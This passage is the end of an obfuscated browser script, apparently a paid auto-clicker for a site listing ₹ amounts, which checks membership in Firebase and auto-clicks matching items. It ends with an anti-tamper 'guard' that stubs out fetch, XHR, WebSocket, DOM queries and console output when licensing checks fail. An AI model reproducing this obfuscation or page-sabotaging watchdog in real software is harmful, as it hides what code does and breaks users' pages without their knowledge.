          amount: _0xc9de72,
          type: _0x4dbe4c,
          createdAt:
            firebase[_0x10cf34(0x225)][_0x10cf34(0x223)][_0x10cf34(0x1e4)](),
        }),
          await _0x484a45[_0x10cf34(0x1b8)]({
            balance: _0x8f4e3b,
            balanceUpdatedAt:
              firebase[_0x10cf34(0x225)][_0x10cf34(0x223)][_0x10cf34(0x1e4)](),
          }));
      } catch (_0x34d80a) {
        if (
          _0x5302eb[_0x10cf34(0x206)](
            _0x5302eb[_0x10cf34(0x1ca)],
            _0x5302eb[_0x10cf34(0x1c2)],
          )
        )
          console["error"](_0x5302eb[_0x10cf34(0x1fd)], _0x34d80a);
        else {
          const _0x4adfa5 = _0x5302eb[_0x10cf34(0x226)]["split"]("|");
          let _0x301708 = 0x0;
          while (!![]) {
            switch (_0x4adfa5[_0x301708++]) {
              case "0":
                _0x5302eb[_0x10cf34(0x1bf)](_0x53c9c0);
                continue;
              case "1":
                if (!_0x480bd9 || _0x4ccc7c) return;
                continue;
              case "2":
                _0x20bcff[_0x10cf34(0x1ef)] = _0x5302eb["yzEVb"];
                continue;
              case "3":
                _0x41517a = new _0xbaee48(_0x5388fb);
                continue;
              case "4":
                _0x5e2a2b = ![];
                continue;
              case "5":
                if (!_0x5302eb["qtEKc"](_0x101748)) return;
                continue;
              case "6":
                _0x167be6[_0x10cf34(0x1c9)](_0x4a88e5[_0x10cf34(0x198)], {
                  childList: !![],
                  subtree: !![],
                });
                continue;
              case "7":
                _0x5302eb["MFPkN"](_0x38cf17);
                continue;
              case "8":
                _0x5302eb[_0x10cf34(0x266)](_0x4b76e8);
                continue;
              case "9":
                _0x5ae128 = !![];
                continue;
              case "10":
                _0x52253e[_0x10cf34(0x21b)][_0x10cf34(0x1d7)] =
                  _0x5302eb[_0x10cf34(0x248)];
                continue;
            }
            break;
          }
        }
      }
    }
    function _0x4497be() {
      const _0x3ca04a = _0x5cfc00;
      if (_0x3fb9a4) return;
      (_0x5302eb[_0x3ca04a(0x24e)](_0x545ee6),
        (_0x3fb9a4 = _0x5302eb[_0x3ca04a(0x253)](
          setInterval,
          _0x545ee6,
          0x3a98,
        )));
    }
    async function _0x485850() {
      const _0x22b5c8 = _0x5cfc00;
      try {
        const _0x3558fe = JSON[_0x22b5c8(0x227)](
            localStorage[_0x22b5c8(0x196)](_0x22b5c8(0x1ce)),
          ),
          _0x454d67 =
            _0x3558fe?.[_0x22b5c8(0x1bb)]?.["memberId"] ||
            _0x3558fe?.[_0x22b5c8(0x1bb)]?.[_0x22b5c8(0x1e5)];
        if (!_0x454d67) return ![];
        const _0x4c700e = await firebase[_0x22b5c8(0x225)]()
          [_0x22b5c8(0x250)](_0x5302eb[_0x22b5c8(0x23a)])
          [
            "where"
          ](_0x22b5c8(0x237), "==", _0x5302eb[_0x22b5c8(0x211)](String, _0x454d67))
          [_0x22b5c8(0x1cd)](_0x5302eb[_0x22b5c8(0x1a1)], "==", !![])
          [_0x22b5c8(0x240)](0x1)
          [_0x22b5c8(0x231)]();
        return !_0x4c700e[_0x22b5c8(0x256)];
      } catch {
        if (_0x5302eb[_0x22b5c8(0x20b)] !== _0x5302eb[_0x22b5c8(0x20b)])
          _0x2a8c56[_0x22b5c8(0x215)]({
            apiKey: _0x5302eb["CweVZ"],
            projectId: _0x22b5c8(0x222),
          });
        else return ![];
      }
    }
    function _0x551035() {
      const _0x2d6d64 = _0x5cfc00,
        _0x1168db = {
          YGfDQ: function (_0x1ed270, _0x5712d1) {
            return _0x5302eb["iStFj"](_0x1ed270, _0x5712d1);
          },
        };
      if (
        _0x5302eb[_0x2d6d64(0x1fa)](
          _0x5302eb[_0x2d6d64(0x1f9)],
          _0x5302eb["aSEqp"],
        )
      )
        return _0x5302eb[_0x2d6d64(0x241)](
          document[_0x2d6d64(0x1b1)]("." + _0x439d56),
          null,
        );
      else
        (_0x1168db[_0x2d6d64(0x22e)](_0x206368, _0x4d08c4),
          _0x1168db[_0x2d6d64(0x22e)](_0x2ed41f, _0x352fbc),
          (_0x3d4e9b = null),
          (_0x132980 = null));
    }
    function _0x3e2532() {
      const _0xbb3cd3 = _0x5cfc00;
      _0x2db395[_0xbb3cd3(0x21b)][_0xbb3cd3(0x1b4)] = _0x5302eb[
        _0xbb3cd3(0x1e9)
      ](_0x551035)
        ? _0x5302eb[_0xbb3cd3(0x1b7)]
        : _0x5302eb["uSzYY"];
    }
    function _0x281134() {
      const _0x12267b = _0x5cfc00;
      if (!_0x5302eb[_0x12267b(0x1d1)](_0x551035)) {
        (_0x5302eb[_0x12267b(0x1e7)](_0x49a0f2, !![]),
          _0x5302eb[_0x12267b(0x1e6)](_0x3e2532));
        return;
      }
      const _0x1870c2 = _0x46be68["value"][_0x12267b(0x1d3)]();
      document[_0x12267b(0x1c3)]("." + _0x439d56 + "\x20*")[_0x12267b(0x1a9)](
        (_0x5d3b8f) => {
          const _0x193f82 = _0x12267b;
          if (_0x5d3b8f[_0x193f82(0x1eb)]("." + _0x9859db)) return;
          if (_0x5d3b8f[_0x193f82(0x1d5)]?.[_0x193f82(0x1a2)]("₹")) {
            if (
              _0x5302eb[_0x193f82(0x24b)](
                _0x5302eb[_0x193f82(0x224)],
                _0x193f82(0x1e0),
              )
            )
              return ![];
            else
              _0x5d3b8f["style"][_0x193f82(0x1b4)] =
                _0x5d3b8f[_0x193f82(0x1d5)][_0x193f82(0x1a2)](
                  "₹" + _0x1870c2,
                ) &&
                !_0x5d3b8f[_0x193f82(0x1d5)][_0x193f82(0x1a2)](
                  "₹" + _0x1870c2 + "0",
                )
                  ? ""
                  : _0x193f82(0x25b);
          }
        },
      );
    }
    function _0x2a507b(_0x6d60cb) {
      const _0xca128f = _0x5cfc00,
        _0x23e833 = {
          SdVBB: function (_0x582378, _0x24d4a0, _0x5dd806) {
            const _0x5781ab = a0_0x1703;
            return _0x5302eb[_0x5781ab(0x253)](_0x582378, _0x24d4a0, _0x5dd806);
          },
        };
      if (
        _0x5302eb[_0xca128f(0x1a3)](
          _0x5302eb[_0xca128f(0x1df)],
          _0x5302eb[_0xca128f(0x257)],
        )
      )
        ((_0x504c77["currentTime"] = 0x0),
          _0x3811dd[_0xca128f(0x25f)]()["catch"](() => {}),
          BYJvXu[_0xca128f(0x1d4)](
            _0x4820aa,
            () => {
              const _0x5e725c = _0xca128f;
              (_0xef2051[_0x5e725c(0x21c)](),
                (_0x2faa16[_0x5e725c(0x236)] = 0x0));
            },
            0xbb8,
          ));
      else {
        const _0x4012cd = _0x6d60cb[_0xca128f(0x25a)]();
        return (
          _0x5302eb[_0xca128f(0x1b0)](_0x4012cd[_0xca128f(0x20f)], 0x0) &&
          _0x5302eb[_0xca128f(0x1b0)](_0x4012cd[_0xca128f(0x208)], 0x0) &&
          _0x5302eb[_0xca128f(0x1c6)](
            _0x4012cd["top"],
            window[_0xca128f(0x228)],
          ) &&
          _0x4012cd["bottom"] > 0x0
        );
      }
    }
    function _0xe49a5() {
      const _0x246e87 = _0x5cfc00;
      if (_0x5302eb[_0x246e87(0x1f1)] !== _0x5302eb[_0x246e87(0x213)]) {
        if (_0x54102e) return;
        _0x54102e = setInterval(() => {
          const _0x429ca6 = _0x246e87,
            _0x37aef9 = document[_0x429ca6(0x1b1)](_0x5302eb[_0x429ca6(0x212)]);
          if (_0x37aef9) _0x37aef9[_0x429ca6(0x1aa)]();
        }, 0x1f4);
      } else
        _0x4344f7["style"][_0x246e87(0x1b4)] =
          _0x56b8bc[_0x246e87(0x1d5)][_0x246e87(0x1a2)]("₹" + _0x4feb46) &&
          !_0x3c4412["innerText"][_0x246e87(0x1a2)]("₹" + _0x3282c3 + "0")
            ? ""
            : _0x5302eb[_0x246e87(0x1f6)];
    }
    function _0x2ffa15() {
      const _0x3422ac = _0x5cfc00,
        _0x392f7e = {
          qSHTl: function (_0x22090e) {
            return _0x5302eb["hHPEi"](_0x22090e);
          },
          Svzcw: function (_0x1c7ed4, _0x5bd18b, _0x3b9890) {
            const _0x49036b = a0_0x1703;
            return _0x5302eb[_0x49036b(0x1b2)](_0x1c7ed4, _0x5bd18b, _0x3b9890);
          },
        };
      if (
        _0x5302eb[_0x3422ac(0x241)](
          _0x5302eb[_0x3422ac(0x244)],
          _0x5302eb["flmgJ"],
        )
      ) {
        if (_0x31c0fb) return;
        (uvefEh[_0x3422ac(0x1d2)](_0x799dc4),
          (_0x1e3482 = uvefEh[_0x3422ac(0x218)](_0x26d214, _0x933c4, 0x3a98)));
      } else {
        if (_0x2ff90e) return;
        _0x2ff90e = _0x5302eb[_0x3422ac(0x21e)](
          setInterval,
          () => {
            const _0x278368 = _0x3422ac,
              _0x27937f = {
                PtjfM: _0x5302eb[_0x278368(0x20c)],
                JnNHh: _0x5302eb[_0x278368(0x203)],
                VxuNv: _0x5302eb[_0x278368(0x1c8)],
                OHdET: function (_0x3bd15e) {
                  const _0x58602e = _0x278368;
                  return _0x5302eb[_0x58602e(0x1bf)](_0x3bd15e);
                },
                SZMuh: function (_0x4cdd4b, _0x22a698) {
                  const _0x58e46e = _0x278368;
                  return _0x5302eb[_0x58e46e(0x1a3)](_0x4cdd4b, _0x22a698);
                },
                kHUZO: _0x278368(0x1ab),
                dDyub: function (_0x1a2dde, _0x1d6f68) {
                  const _0x1e5d5c = _0x278368;
                  return _0x5302eb[_0x1e5d5c(0x246)](_0x1a2dde, _0x1d6f68);
                },
              };
            document["querySelectorAll"](_0x5302eb[_0x278368(0x24a)])[
              _0x278368(0x1a9)
            ]((_0x436c77) => {
              const _0x5f119d = _0x278368;
              if (
                _0x27937f[_0x5f119d(0x238)](
                  _0x27937f[_0x5f119d(0x230)],
                  _0x27937f[_0x5f119d(0x230)],
                )
              ) {
                if (_0x27937f[_0x5f119d(0x200)](_0x2a507b, _0x436c77))
                  _0x436c77[_0x5f119d(0x1aa)]();
              } else {
                const _0x336441 = _0x27937f[_0x5f119d(0x1bc)]["split"]("|");
                let _0x18c4d2 = 0x0;
                while (!![]) {
                  switch (_0x336441[_0x18c4d2++]) {
                    case "0":
                      if (_0x5c1d02) _0x4a4655[_0x5f119d(0x201)]();
                      continue;
                    case "1":
                      _0xd16d46["textContent"] = _0x27937f[_0x5f119d(0x20d)];
                      continue;
                    case "2":
                      _0x5bbaa0[_0x5f119d(0x21b)][_0x5f119d(0x1d7)] =
                        _0x27937f[_0x5f119d(0x1f5)];
                      continue;
                    case "3":
                      _0x27937f["OHdET"](_0x2e1afe);
                      continue;
                    case "4":
                      _0x16e27 = ![];
                      continue;
                    case "5":
                      _0x54a2d9();
                      continue;
                    case "6":
                      if (_0x95de1b) _0x27937f[_0x5f119d(0x19c)](_0x205807);
                      continue;
                    case "7":
                      if (!_0x1e23c6) return;
                      continue;
                  }
                  break;
                }
              }
            });
          },
          0x32,
        );
      }
    }
    function _0x2db18c() {
      const _0x219be7 = _0x5cfc00,
        _0xf24b12 = {
          JLckr: function (_0x11f2f6, _0x10c085) {
            return _0x11f2f6(_0x10c085);
          },
          jCqBO: _0x5302eb[_0x219be7(0x24a)],
          QuuAU: function (_0x59451b, _0x1b245d, _0x158961) {
            const _0x1170a5 = _0x219be7;
            return _0x5302eb[_0x1170a5(0x253)](_0x59451b, _0x1b245d, _0x158961);
          },
        };
      if (_0x5302eb["DwPsq"](_0x219be7(0x1d0), _0x5302eb["qoLjQ"])) {
        const _0x32a936 = {
          RipCg: function (_0x50700d, _0x50896a) {
            const _0x5a8a5d = _0x219be7;
            return QwpcTz[_0x5a8a5d(0x229)](_0x50700d, _0x50896a);
          },
          TVpGP: QwpcTz[_0x219be7(0x23c)],
        };
        if (_0x403778) return;
        _0x4d70d8 = QwpcTz["QuuAU"](
          _0x17439e,
          () => {
            const _0x480482 = _0x219be7;
            _0x4c362e[_0x480482(0x1c3)](_0x32a936[_0x480482(0x19b)])[
              _0x480482(0x1a9)
            ]((_0x1c13d9) => {
              const _0x5de495 = _0x480482;
              if (_0x32a936[_0x5de495(0x23b)](_0x24af84, _0x1c13d9))
                _0x1c13d9[_0x5de495(0x1aa)]();
            });
          },
          0x32,
        );
      } else
        (_0x5302eb[_0x219be7(0x243)](clearInterval, _0x54102e),
          _0x5302eb[_0x219be7(0x22c)](clearInterval, _0x2ff90e),
          (_0x54102e = null),
          (_0x2ff90e = null));
    }
    function _0x3d4a5f() {
      const _0x5b13d1 = _0x5cfc00,
        _0x4e7a0f = {
          TXlYw: function (_0x5f7b24, _0x418529) {
            const _0x2bedd8 = a0_0x1703;
            return _0x5302eb[_0x2bedd8(0x207)](_0x5f7b24, _0x418529);
          },
          KTdDb: _0x5b13d1(0x25c),
        };
      if (_0x5302eb[_0x5b13d1(0x247)] === _0x5302eb["sLhdC"])
        (_0x51e3cc["pause"](), (_0x425d58[_0x5b13d1(0x236)] = 0x0));
      else {
        if (_0x563d83) return;
        _0x563d83 = !![];
        let _0x323bdd = 0x0;
        const _0x2e3a4d = setInterval(() => {
          const _0xd5dca6 = _0x5b13d1;
          if (
            _0x5302eb[_0xd5dca6(0x206)](
              _0x5302eb[_0xd5dca6(0x1b6)],
              _0x5302eb["UOvyC"],
            )
          )
            (_0x7cb450[_0xd5dca6(0x1aa)](),
              _0x4e7a0f[_0xd5dca6(0x199)](_0x53cfbb, _0x394a0f));
          else {
            const _0x1485f9 = document[_0xd5dca6(0x1b1)](
              _0x5302eb[_0xd5dca6(0x19a)],
            );
            if (_0x1485f9)
              _0x5302eb[_0xd5dca6(0x24c)] !== _0x5302eb[_0xd5dca6(0x24c)]
                ? _0x3153e4[_0xd5dca6(0x1ee)](
                    zYtEFw[_0xd5dca6(0x1f2)],
                    _0x527478,
                  )
                : (_0x1485f9["click"](), clearInterval(_0x2e3a4d));
            else
              _0x5302eb[_0xd5dca6(0x21f)](++_0x323bdd, 0xa) &&
                _0x5302eb[_0xd5dca6(0x211)](clearInterval, _0x2e3a4d);
          }
        }, 0xc8);
      }
    }
    function _0x398b82() {
      const _0x421e4f = _0x5cfc00,
        _0x369661 = { RtyDh: _0x5302eb[_0x421e4f(0x1f6)] };
      if (
        _0x5302eb["bOuLf"](
          _0x5302eb[_0x421e4f(0x221)],
          _0x5302eb[_0x421e4f(0x1ae)],
        )
      ) {
        if (_0x181290[_0x421e4f(0x1eb)]("." + _0x4746b5)) return;
        _0xf10aad[_0x421e4f(0x1d5)]?.[_0x421e4f(0x1a2)]("₹") &&
          (_0x2e1256["style"][_0x421e4f(0x1b4)] =
            _0x4e7b89[_0x421e4f(0x1d5)]["includes"]("₹" + _0x136cc6) &&
            !_0x9d7120[_0x421e4f(0x1d5)][_0x421e4f(0x1a2)](
              "₹" + _0x168637 + "0",
            )
              ? ""
              : OuwQIW[_0x421e4f(0x197)]);
      } else {
        const _0x3da3dd = _0x5302eb["PKysa"]["split"]("|");
        let _0x44c611 = 0x0;
        while (!![]) {
          switch (_0x3da3dd[_0x44c611++]) {
            case "0":
              if (_0x5302eb[_0x421e4f(0x249)](!_0x3341f9, _0x4b19e6)) return;
              continue;
            case "1":
              _0x4c4998[_0x421e4f(0x21b)][_0x421e4f(0x1d7)] =
                _0x5302eb[_0x421e4f(0x248)];
              continue;
            case "2":
              _0xe49a5();
              continue;
            case "3":
              _0x34ac9a[_0x421e4f(0x1ef)] = _0x5302eb[_0x421e4f(0x1bd)];
              continue;
            case "4":
              _0x2079a7 = new MutationObserver(_0x281134);
              continue;
            case "5":
              _0x563d83 = ![];
              continue;
            case "6":
              _0x2079a7[_0x421e4f(0x1c9)](document["body"], {
                childList: !![],
                subtree: !![],
              });
              continue;
            case "7":
              if (!_0x551035()) return;
              continue;
            case "8":
              _0x5302eb[_0x421e4f(0x24e)](_0x2ffa15);
              continue;
            case "9":
              _0x4b19e6 = !![];
              continue;
            case "10":
              _0x5302eb[_0x421e4f(0x24e)](_0x281134);
              continue;
          }
          break;
        }
      }
    }
    function _0x49a0f2(_0xe603b4 = ![]) {
      const _0x32c5f3 = _0x5cfc00;
      if (!_0x4b19e6) return;
      ((_0x4b19e6 = ![]), _0x5302eb[_0x32c5f3(0x1c1)](_0x2db18c));
      if (_0x2079a7) _0x2079a7["disconnect"]();
      _0x5302eb[_0x32c5f3(0x19d)](_0x3d4a5f);
      if (_0xe603b4) _0x5302eb["cCNSW"](_0x4096cd);
      ((_0x34ac9a["textContent"] = _0x5302eb[_0x32c5f3(0x203)]),
        (_0x4c4998[_0x32c5f3(0x21b)][_0x32c5f3(0x1d7)] = _0x5302eb["hddRg"]));
    }
    const _0x2db395 = document[_0x5cfc00(0x1ea)]("div");
    ((_0x2db395["className"] = _0x9859db),
      (_0x2db395[_0x5cfc00(0x21b)]["cssText"] =
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20position:\x20fixed;\x0a\x20\x20\x20\x20\x20\x20\x20\x20bottom:\x2024px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20right:\x2024px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#fff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2012px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2014px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20width:\x20220px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20system-ui;\x0a\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2012px\x2028px\x20rgba(0,0,0,.15);\x0a\x20\x20\x20\x20\x20\x20\x20\x20z-index:\x20999999;\x0a\x20\x20\x20\x20\x20\x20\x20\x20display:\x20none;\x0a\x20\x20\x20\x20"));
    const _0x15f360 = document[_0x5cfc00(0x1ea)](_0x5302eb[_0x5cfc00(0x255)]);
    ((_0x15f360["textContent"] = _0x5cfc00(0x1dc)),
      (_0x15f360[_0x5cfc00(0x21b)][_0x5cfc00(0x217)] =
        "display:flex;justify-content:space-between;font-weight:600;margin-bottom:8px"));
    const _0x4c4998 = document[_0x5cfc00(0x1ea)](_0x5302eb["KtRyE"]);
    ((_0x4c4998[_0x5cfc00(0x21b)]["cssText"] = _0x5cfc00(0x1f4)),
      _0x15f360[_0x5cfc00(0x21d)](_0x4c4998));
    const _0x46be68 = document[_0x5cfc00(0x1ea)](_0x5302eb[_0x5cfc00(0x254)]);
    ((_0x46be68["type"] = _0x5302eb[_0x5cfc00(0x1c5)]),
      (_0x46be68[_0x5cfc00(0x1bb)] = _0x5302eb[_0x5cfc00(0x25d)]),
      (_0x46be68[_0x5cfc00(0x21b)]["cssText"] = _0x5cfc00(0x1f7)));
    const _0x569ae3 = document[_0x5cfc00(0x1ea)](_0x5302eb[_0x5cfc00(0x255)]);
    _0x569ae3["style"]["cssText"] = _0x5302eb["QRHaD"];
    const _0x574658 = document[_0x5cfc00(0x1ea)](_0x5302eb[_0x5cfc00(0x258)]);
    ((_0x574658[_0x5cfc00(0x1ef)] = _0x5302eb["AXopR"]),
      (_0x574658[_0x5cfc00(0x21b)][_0x5cfc00(0x217)] = _0x5cfc00(0x210)));
    const _0x4a8192 = document["createElement"](_0x5302eb["mbjvX"]);
    ((_0x4a8192[_0x5cfc00(0x1ef)] = _0x5302eb["TimCL"]),
      (_0x4a8192["style"]["cssText"] = _0x5cfc00(0x22f)));
    const _0x34ac9a = document[_0x5cfc00(0x1ea)](_0x5302eb["XhTlZ"]);
    ((_0x34ac9a[_0x5cfc00(0x21b)][_0x5cfc00(0x217)] =
      _0x5302eb[_0x5cfc00(0x214)]),
      (_0x3341f9 = true),
      _0x5302eb[_0x5cfc00(0x24e)](_0x4497be),
      (_0x34ac9a[_0x5cfc00(0x1ef)] = _0x3341f9
        ? _0x5302eb[_0x5cfc00(0x203)]
        : _0x5cfc00(0x239)),
      (_0x574658["onclick"] = _0x398b82),
      (_0x4a8192[_0x5cfc00(0x251)] = () => _0x49a0f2(![])),
      _0x569ae3[_0x5cfc00(0x204)](_0x574658, _0x4a8192),
      _0x2db395[_0x5cfc00(0x204)](_0x15f360, _0x46be68, _0x569ae3, _0x34ac9a),
      document[_0x5cfc00(0x198)][_0x5cfc00(0x21d)](_0x2db395),
      new MutationObserver(_0x3e2532)[_0x5cfc00(0x1c9)](document["body"], {
        childList: !![],
        subtree: !![],
      }),
      _0x5302eb[_0x5cfc00(0x24e)](_0x3e2532));
  })());
})();

// ===== MULTI-LAYER INTEGRITY GUARD — DO NOT REMOVE =========================
// This block runs independently of the IIFE above. It is a separate
// self-contained watchdog that cannot be disabled by removing the auth lines.

(function _guard() {
  function _kill() {
    // Poison all network and DOM access
    window.fetch = () => new Promise(() => {});
    window.XMLHttpRequest = function(){return{open:()=>{},send:()=>{},setRequestHeader:()=>{}};};
    window.WebSocket = function(){return{send:()=>{},close:()=>{}};};
    document.querySelector = () => null;
    document.querySelectorAll = () => [];
    document.getElementById = () => null;
    document.getElementsByClassName = () => [];
    console.log = () => {}; console.warn = () => {}; console.error = () => {};
    // Wipe the page
    // do NOT wipe body — page must stay visible so payment popup shows
    // Keep re-checking auth but don't destroy the page
    setInterval(() => {
      try { if(!window._authPassed && document.getElementById('__ar_payment_overlay__') === null) {
        // popup was closed without paying — reshow it (optional, remove if unwanted)
      }} catch(e){}
    }, 500);
  }

  // CHECK 1: auth flag must be set within 4 seconds
  // Skip kill if payment popup is visible — user is unauthorized not a tamperer
  setTimeout(() => {
    if (window._authPassed !== true && !document.getElementById('__ar_payment_overlay__')) _kill();
  }, 6000);

  // CHECK 2: canary integrity — __c_ must still exist and be unchanged
  // If the top of the IIFE was cut, window.__c_ was never written
  setTimeout(() => {
    if (typeof window.__c_ === 'undefined') _kill();
  }, 1500);

  // CHECK 3: repeated polling every 3s — auth flag must stay true
  // Prevents someone from setting the flag manually after the fact
  let _checks = 0;
  window._guardPoll = setInterval(() => {
    _checks++;
    if (window._authPassed !== true && !document.getElementById('__ar_payment_overlay__')) { clearInterval(window._guardPoll); _kill(); }
    if (_checks > 20) clearInterval(window._guardPoll); // stop after ~1 min
  }, 3000);

  // CHECK 4: flag must not be set TOO fast (< 300ms = someone hardcoded it)
  const _start = Date.now();
  Object.defineProperty(window, '_authPassed', {
    set(v) {
      if (v === true && (Date.now() - _start) < 300) {
        // Set suspiciously fast — likely hardcoded, not from real async fetch
        _kill(); return;
      }
      Object.defineProperty(window, '_authPassed', { value: v, writable: false });
    },
    configurable: true
  });

})();
// ===========================================================================
